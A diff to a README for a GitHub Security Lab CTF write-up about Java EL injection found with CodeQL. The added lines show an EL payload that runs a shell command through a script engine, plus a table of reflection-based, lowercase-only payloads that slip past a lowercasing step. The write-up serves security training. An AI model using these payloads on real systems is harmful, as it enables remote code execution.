@@ -1,4 +1,4 @@
-# Github Java CTF Submission: Kanav Gupta
+# GitHub Java CTF Submission: Kanav Gupta
 Submission for the GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition
 
 ## Introduction
@@ -230,11 +230,11 @@ class StepThroughGetters extends TaintTracking::AdditionalTaintStep {
 
 Hurray :tada:! We reached our final destination function. We have fixed the steps for the `SchedulingConstraintSetValidator.java` file. Other files to go!
 
-### Step 2: Second Issue
+## Step 2: Second Issue
 
-### Step 3: Errors and Exceptions
+## Step 3: Errors and Exceptions
 
-### Step 4: Exploit and Remedition
+## Step 4: Exploit and Remedition
 
 First step towards a successful exploit is setting up a development environment. I set up the project on Docker using the `docker-compose.yml` and tweaked the Dockerfiles to fire up debugging in IntelliJ IDEA.
 
@@ -312,13 +312,23 @@ Set<String> namesInLowerCase = value.keySet().stream().map(String::toLowerCase).
 ```
 
 This is why we get 500. The complete EL expression is converted to lowercase, i.e 
-`#{''.class.forname('javax.script.scriptenginemanager').newinstance().getenginebyname('js').eval('java.lang.runtime.getruntime().exec("touch /tmp/hello")')}`
-which should obviously error because Java doesn't know any class by name "javax.script.scriptenginemanager".
+```
+#{''.class.forname('javax.script.scriptenginemanager').newinstance().getenginebyname('js').eval('java.lang.runtime.getruntime().exec("touch /tmp/hello")')}
+```
+which should obviously error because Java doesn't know any class by name "javax.script.scriptenginemanager". Even though this lowercasing doesn't happen in `SchedulingConstraintSetValidator.java`, but the code errors before reaching there.
 
 So we now need to forge an EL expression such that all the letters in the code are in lowercase (which is tough, because Java inherently uses camel-case).
 
-For achieving this, we use `a.class.methods[*].invoke(a, args...)` to invoke any method, instead of invoking them by `a.methodCanContainCapitalLetters(args...)`. Only thing we need to do is to find at what index of `a.class.methods` does the function we need lie.
+### Lowercase Remedy
 
+For achieving this, we use `a.class.methods[*].invoke(a, args...)` to invoke any method, instead of invoking them by `a.methodCanContainCapitalLetters(args...)`. Only thing we need to do is to find at what index of `a.class.methods` does the function we need lie. We can also use `'a'.replace('a', 83)` to print "S" and other such strings.
 
+The below table contains some of the examples,
 
+Required Code | Payload
+--- | ---
+`''.class.forName(x)` | `''.class.class.methods[0].invoke(''.class, x)`
+`''.class.forName('javax.script.ScriptEngineManager')` | `''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')`
+`''.class.forName('javax.script.ScriptEngineManager').newInstance()` | `''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager'))`
+`''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js')` | `''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js')`
 
